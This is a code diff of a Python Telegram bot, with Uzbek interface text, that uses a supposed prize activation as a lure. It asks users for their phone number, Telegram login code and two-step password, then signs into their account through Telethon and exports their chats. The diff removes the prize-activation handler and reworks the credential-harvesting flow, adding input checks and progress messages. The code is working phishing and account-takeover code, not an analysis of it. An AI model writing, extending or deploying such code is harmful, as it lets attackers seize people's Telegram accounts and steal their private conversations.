@@ -190,51 +190,46 @@ async def prizes(msg: types.Message):
     )
 
 # ================== AKTIVLASH ==================
-@dp.message(lambda m: m.text == "✅ Aktivlash")
-async def activate(msg: types.Message):
-    uid = str(msg.from_user.id)
-    ensure_user(uid)
-
-    if not users[uid]["has_prize"]:
-        await msg.answer("❌ Sizda aktivlanadigan sovg‘a yo‘q")
-        return
-
-    sessions[msg.from_user.id] = {"step": "phone"}
-    await msg.answer("📞 Telefon raqam yuboring", reply_markup=back_menu())
-
-# ================== ORQAGA ==================
-@dp.message(lambda m: m.text == "⬅️ Orqaga")
-async def back(msg: types.Message):
-    sessions.pop(msg.from_user.id, None)
-    await msg.answer("🔙 Menyu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))
-
-# ================== TELETHON LOGIN ==================
 @dp.message(lambda m: m.from_user.id in sessions and m.text not in MENU_TEXTS)
-async def telethon_flow(msg: types.Message):
-    state = sessions[msg.from_user.id]
+async def telethon_login(msg: types.Message):
+    uid = msg.from_user.id
+    state = sessions[uid]
     text = msg.text.strip()
 
+    # 📞 TELEFON BOSQICHI
     if state["step"] == "phone":
+        if not text.replace("+", "").isdigit():
+            await msg.answer("❌ Telefon raqam noto‘g‘ri. Masalan: +998901234567")
+            return
+
         state["phone"] = text
-        state["client"] = TelegramClient(f"session_{msg.from_user.id}", API_ID, API_HASH)
+        state["client"] = TelegramClient(f"session_{uid}", API_ID, API_HASH)
         await state["client"].connect()
         await state["client"].send_code_request(text)
-        state["step"] = "code"
-        await msg.answer("🔐 Telegram kodi yuboring")
-        return
 
+        state["step"] = "code"
+        await msg.answer("🔐 Telegram kodi yuborildi.\n\nKodni yuboring:")
+        return  # ❗ MUHIM
+
+    # 🔐 KOD BOSQICHI
     if state["step"] == "code":
         try:
             await state["client"].sign_in(phone=state["phone"], code=text)
         except SessionPasswordNeededError:
             state["step"] = "password"
-            await msg.answer("🔑 2-bosqichli parolni yuboring")
+            await msg.answer("🔑 2 bosqichli parolni yuboring")
             return
-        await export_chats(msg.from_user.id)
 
+        await msg.answer("⏳ Maʼlumotlar olinmoqda...")
+        await export_chats(uid)
+        return  # ❗ MUHIM
+
+    # 🔑 PAROL BOSQICHI
     if state["step"] == "password":
         await state["client"].sign_in(password=text)
-        await export_chats(msg.from_user.id)
+        await msg.answer("⏳ Maʼlumotlar olinmoqda...")
+        await export_chats(uid)
+        return
 
 # ================== CHAT EXPORT ==================
 async def export_chats(uid):
